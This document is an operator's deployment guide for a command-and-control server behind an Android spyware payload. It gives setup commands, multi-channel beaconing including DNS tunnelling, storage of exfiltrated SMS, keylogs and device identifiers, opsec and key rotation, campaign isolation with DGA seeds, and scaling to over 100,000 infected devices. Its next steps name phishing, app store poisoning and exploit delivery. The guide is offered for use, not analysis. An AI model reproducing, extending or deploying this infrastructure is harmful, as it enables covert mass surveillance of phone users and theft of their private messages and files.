# C2 SERVER DEPLOYMENT GUIDE

## Prerequisites

- Docker & Docker Compose (>= 20.10)
- Linux server (Ubuntu 20.04+ recommended)
- Domain name (e.g., c2.example.com)
- SSL certificate (Let's Encrypt or self-signed)
- Firebase Cloud Messaging credentials (optional)
- AWS credentials (optional, for KMS key management)

---

## QUICKSTART

### 1. Clone and Setup

```bash
git clone https://github.com/operator/c2-infrastructure.git
cd c2-infrastructure

# Create environment file
cp .env.example .env

# Edit secrets
nano .env
# Set: FIREBASE_PROJECT_ID, FIREBASE_KEY, PANEL_SECRET_KEY, GRAFANA_PASSWORD
```

### 2. Generate TLS Certificates

```bash
# Self-signed (for testing only)
openssl req -x509 -newkey rsa:4096 -keyout certs/server.key -out certs/server.crt -days 365 -nodes

# Production: Use Let's Encrypt
certbot certonly --standalone -d c2.example.com
cp /etc/letsencrypt/live/c2.example.com/fullchain.pem certs/server.crt
cp /etc/letsencrypt/live/c2.example.com/privkey.pem certs/server.key
```

### 3. Initialize Database

```bash
# Create database schema
sqlite3 c2.db < schema.sql

# Verify
sqlite3 c2.db ".tables"
# Output: audit_log commands devices exfil_* modules operators sessions ...
```

### 4. Start Infrastructure

```bash
# Build containers
docker-compose build

# Start services
docker-compose up -d

# Verify all containers running
docker-compose ps
```

### 5. Verify Connectivity

```bash
# Check C2 WebSocket endpoint
curl -v wss://c2.example.com/ws

# Check Panel API
curl https://c2.example.com/api/dashboard/test

# Check Prometheus metrics
curl https://c2.example.com/metrics (via monitoring port)
```

---

## ARCHITECTURE OVERVIEW

```
┌─────────────────────────────────────────────────────────┐
│                  DEVICE (Android Payload)                │
│                                                           │
│  ┌──────────────────────────────────────────────────┐   │
│  │  WebSocket Connection (Primary)                  │   │
│  │  ↓ Encrypted Beacons                             │   │
│  └──────────────────────────────────────────────────┘   │
│                         ↓                                │
│  ┌──────────────────────────────────────────────────┐   │
│  │  FCM Push (Secondary, when offline)              │   │
│  └──────────────────────────────────────────────────┘   │
│                         ↓                                │
│  ┌──────────────────────────────────────────────────┐   │
│  │  MQTT Subscribe (Tertiary, persistent)           │   │
│  └──────────────────────────────────────────────────┘   │
│                         ↓                                │
│  ┌──────────────────────────────────────────────────┐   │
│  │  DNS Tunnel (Fallback, when TCP blocked)         │   │
│  └──────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
         ↓↓↓↓↓↓↓↓↓↓↓↓↓ Encrypted ↓↓↓↓↓↓↓↓↓↓↓↓↓↓
┌─────────────────────────────────────────────────────────┐
│                    INFRASTRUCTURE (VPS)                  │
│                                                           │
│  ┌─────────────────────────────────────────────────┐    │
│  │  Nginx Reverse Proxy                            │    │
│  │  • TLS termination                              │    │
│  │  • Rate limiting (100K req/s)                   │    │
│  │  • CDN-compatible (Cloudflare-ready)            │    │
│  └─────────────────────────────────────────────────┘    │
│         ↓↓↓↓↓↓↓   HTTP/2   ↓↓↓↓↓↓↓                      │
│  ┌──────────────┬──────────────┬──────────────┐         │
│  │ C2 Server    │ Panel API    │ FCM Relay    │         │
│  │ (WebSocket)  │ (WARP)       │ (WARP)       │         │
│  └──────────────┴──────────────┴──────────────┘         │
│         ↓                ↓              ↓                │
│  ┌─────────────────────────────────────────────────┐    │
│  │  MQTT Broker (Mosquitto)                        │    │
│  │  • Persistent device subscriptions              │    │
│  │  • ACL-based access control                     │    │
│  │  • Message persistence                          │    │
│  └─────────────────────────────────────────────────┘    │
│         ↓                                                │
│  ┌─────────────────────────────────────────────────┐    │
│  │  DNS Tunnel Endpoint                            │    │
│  │  • UDP port 53                                  │    │
│  │  • Base32 encoding                              │    │
│  └─────────────────────────────────────────────────┘    │
│         ↓                                                │
│  ┌─────────────────────────────────────────────────┐    │
│  │  SQLite Database (with AES-256 encryption)      │    │
│  │  • Device registry                              │    │
│  │  • Exfiltrated data (encrypted)                 │    │
│  │  • Commands & sessions                          │    │
│  └─────────────────────────────────────────────────┘    │
│         ↑                                                │
│  ┌─────────────────────────────────────────────────┐    │
│  │  Monitoring Stack                               │    │
│  │  • Prometheus (metrics)                         │    │
│  │  • Grafana (dashboards)                         │    │
│  │  • Elasticsearch + Kibana (logs)                │    │
│  └─────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────┘
```

---

## OPERATIONAL SECURITY

### Key Management

```bash
# Generate master encryption key
openssl rand -base64 32 > .encryption-key

# Store in secure location (AWS KMS, HashiCorp Vault, etc.)
aws kms encrypt --plaintext fileb://.encryption-key --key-id alias/c2-master

# Rotate keys quarterly
# Update in .env and redeploy containers
docker-compose restart c2-server panel-api
```

### Database Encryption

All sensitive fields are encrypted at rest:
- IMEI / Phone numbers
- SMS bodies
- Notification content
- Exfiltrated files
- Keylog data

```bash
# Verify encryption is active
sqlite3 c2.db "SELECT typeof(imei) FROM devices LIMIT 1;"
# Should return: blob (not text)
```

### TLS Certificate Rotation

```bash
# Renew with Let's Encrypt
certbot renew --quiet

# Copy to Docker volume
cp /etc/letsencrypt/live/c2.example.com/fullchain.pem certs/server.crt
cp /etc/letsencrypt/live/c2.example.com/privkey.pem certs/server.key

# Reload Nginx
docker exec c2-proxy nginx -s reload
```

### Backup & Disaster Recovery

```bash
# Daily backup (automated with cron)
0 2 * * * /scripts/backup.sh

# Backup script
#!/bin/bash
BACKUP_DIR="/backups/c2"
DATE=$(date +%Y%m%d_%H%M%S)

# Database backup
sqlite3 c2.db ".backup $BACKUP_DIR/c2_$DATE.db"
gzip $BACKUP_DIR/c2_$DATE.db

# Docker volume backup
docker run --rm -v c2_mosquitto-data:/data -v $BACKUP_DIR:/backup \
  alpine tar czf /backup/mosquitto_$DATE.tar.gz -C /data .

# Upload to S3
aws s3 cp $BACKUP_DIR/ s3://c2-backups/ --recursive
```

### Monitoring & Alerting

```bash
# Access Grafana dashboard
# https://c2.example.com/grafana
# Login: admin / (password from .env)

# Key metrics to monitor:
# - Active device connections
# - Command success rate
# - Data ingestion rate (MB/sec)
# - Database query latency
# - Disk space usage

# Alert thresholds (Prometheus):
# - Devices < 50%: anomaly detection
# - Commands failed > 5%: investigate
# - Database latency > 100ms: scale up
```

---

## TROUBLESHOOTING

### Device won't connect

```bash
# Check C2 server logs
docker logs c2-server | tail -50

# Verify WebSocket endpoint
wscat -c wss://c2.example.com/ws

# Check device fingerprint validation
# Device must prove it knows the environmental key hash
```

### Commands not reaching devices

```bash
# Check command queue
sqlite3 c2.db "SELECT COUNT(*) FROM commands WHERE status='pending';"

# Verify device session
sqlite3 c2.db "SELECT session_id, last_activity FROM sessions WHERE device_id='xxx';"

# Check FCM fallback
docker logs fcm-relay | grep "push"
```

### High memory usage

```bash
# Check connection count
docker exec c2-server curl -s http://localhost:9090/metrics | grep c2_active_connections

# If >50K: consider horizontal scaling
# Add load balancer + multiple C2 nodes
```

### Database corruption

```bash
# Integrity check
sqlite3 c2.db "PRAGMA integrity_check;"

# If corrupted: restore from backup
cp /backups/c2/c2_YYYYMMDD.db.gz .
gunzip c2_YYYYMMDD.db.gz
mv c2_YYYYMMDD.db c2.db
docker-compose restart
```

---

## SCALING FOR 100K+ DEVICES

### Horizontal Scaling

```yaml
# Multi-node C2 deployment
# Use Redis for session store

redis:
  image: redis:7
  container_name: c2-redis
  ports:
    - "6379:6379"
  volumes:
    - redis-data:/data

# Update C2 server to use Redis backend:
# - Session state (instead of in-memory DashMap)
# - Device registry (with prefix keys)
# - Command queue (shared across nodes)
```

### Load Balancer

```bash
# Nginx upstream with multiple C2 nodes
upstream c2_server {
  least_conn;
  server c2-node-1:8080 weight=1;
  server c2-node-2:8080 weight=1;
  server c2-node-3:8080 weight=1;
  keepalive 256;
}
```

### Database Sharding

For >1M devices, shard database by device_id:
```
Device 0-ZZZZZZ... → DB node 1
Device 100000-200000... → DB node 2
Device 200000-300000... → DB node 3
```

---

## COMPLIANCE & OPERATIONAL SECURITY

### Audit Logging

All operator actions logged:
```bash
# View audit trail
sqlite3 c2.db "SELECT * FROM audit_log WHERE operator_id='xxx' ORDER BY timestamp DESC;"
```

### Access Control

```bash
# Panel access via TOTP + IP whitelist
# Configure in .env:
PANEL_REQUIRE_TOTP=true
PANEL_IP_WHITELIST="203.0.113.0/24,198.51.100.0/24"
```

### Campaign Isolation

Each campaign has:
- Isolated C2 keypair
- Unique DGA seed
- Separate command queue
- Independent data storage

```bash
# List campaigns
sqlite3 c2.db "SELECT campaign_id, created_at, device_count FROM campaigns;"
```

---

## NEXT STEPS

1. **Android Payload Build** — Configure builder with unique compilation per campaign
2. **Delivery Methods** — Set up phishing, app store poisoning, or exploit delivery
3. **Operator Training** — Security awareness, OPSEC practices, incident response
4. **Infrastructure Hardening** — Rate limiting, IDS/IPS, network segmentation
5. **Legal/Compliance** — Ensure operation complies with jurisdiction laws

---

## SUPPORT & DOCUMENTATION

- Issue tracker: https://github.com/operator/c2-infrastructure/issues
- Wiki: https://github.com/operator/c2-infrastructure/wiki
- Threat model: `THREAT_MODEL.md`
- Architecture: `ARCHITECTURE.md`
